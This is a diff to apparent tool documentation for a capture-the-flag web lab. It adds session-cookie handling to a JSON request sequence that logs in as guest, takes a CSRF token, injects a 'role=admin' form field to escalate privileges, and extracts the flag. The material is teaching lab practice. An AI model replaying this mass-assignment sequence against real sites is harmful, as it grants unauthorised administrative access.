@@ -51,22 +51,26 @@ get looks exactly like the finding you were hoping for.
     { "name": "log in", "resend": 0, "create": true,
       "set": ["method=POST", "path=/api/login",
               "header.Content-Type=application/json",
-              "json.user=${user}", "json.password=${password}"] },
+              "json.user=${user}", "json.password=${password}"],
+      "extract": { "cookie": "header:set-cookie" } },
 
     { "name": "render the form and take its token",
       "resend": 0, "create": true,
-      "set": ["method=GET", "path=/account/settings"],
+      "set": ["method=GET", "path=/account/settings",
+              "header.Cookie=${cookie}"],
       "extract": { "csrf": "regex:name=\"csrf\" value=\"([^\"]+)\"" } },
 
     { "name": "save, with one field the form never had",
       "resend": 0, "create": true,
       "set": ["method=POST", "path=/account/settings",
               "header.Content-Type=application/x-www-form-urlencoded",
+              "header.Cookie=${cookie}",
               "form.display_name=Guest", "form.csrf=${csrf}",
               "form.role=admin"] },
 
     { "name": "collect", "resend": 0, "create": true,
-      "set": ["method=GET", "path=/admin/flag"],
+      "set": ["method=GET", "path=/admin/flag",
+              "header.Cookie=${cookie}"],
       "extract": { "flag": "regex:(FLAG\\{[^}]+\\})" } }
   ]
 }
@@ -78,8 +82,11 @@ h5i websec sequence flow.json --session lab41 --var user=guest --var password=gu
 
 The parts:
 
-* **`resend: N`** — which stored message each step is built from. Everything
-  here starts from `req_0`, the homepage GET, plus `create: true`.
+* **`resend: N`** — which stored message each step is built from. Every step
+  here starts from the homepage GET (plus `create: true`). That request is not
+  `req_0`: the browser's own traffic takes the low numbers, so `solve.sh` reads
+  the real sequence number off `open` and writes it into the file before the
+  run. Find yours with `h5i websec requests --session lab41 --url-contains /`.
 * **`extract`** — what to bind out of the answer, by name. Four extractors:
   `regex:` (first capture group), `json:` (a dotted path), `header:`, and
   `status`.
